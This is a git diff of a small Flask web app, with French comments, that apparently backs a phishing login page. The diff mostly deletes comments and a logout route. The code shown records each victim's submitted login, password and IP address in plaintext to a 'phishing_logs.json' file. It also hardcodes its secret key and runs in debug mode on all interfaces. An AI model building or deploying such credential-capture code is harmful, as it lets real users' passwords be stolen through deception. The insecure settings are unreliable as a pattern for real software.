@@ -6,10 +6,8 @@ from datetime import datetime, timezone
 app = Flask(__name__)
 app.secret_key = 'ta_cle_secrete'
 
-# Chemin vers le fichier JSON de logs
 LOG_FILE = os.path.join(os.path.dirname(__file__), 'logs', 'phishing_logs.json')
 
-# Créer le dossier et le fichier de logs s'ils n'existent pas
 os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
 if not os.path.exists(LOG_FILE):
     with open(LOG_FILE, 'w') as f:
@@ -31,14 +29,11 @@ def log_attempt(login, password, ip):
         "event": "fake_login_attempt"
     }
 
-    # Lire les logs existants
     with open(LOG_FILE, 'r') as f:
         logs = json.load(f)
 
-    # Ajouter la nouvelle tentative de connexion
     logs.append(log_entry)
 
-    # Écrire les logs mis à jour
     with open(LOG_FILE, 'w') as f:
         json.dump(logs, f, indent=4)
 
@@ -55,7 +50,7 @@ def password():
         password = request.form.get('password')
         ip = request.remote_addr
 
-        # Enregistrer les informations dans le fichier JSON
+
         log_attempt(session.get('login', ''), password, ip)
 
         session['connected'] = True
@@ -76,12 +71,6 @@ def connect():
     html_content = read_html_file('connect.html')
     html_content = html_content.replace('{{ login }}', session.get('login', ''))
     return html_content
-
-@app.route('/logout')
-def logout():
-    session.pop('connected', None)
-    session.pop('login', None)
-    return redirect(url_for('login'))
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
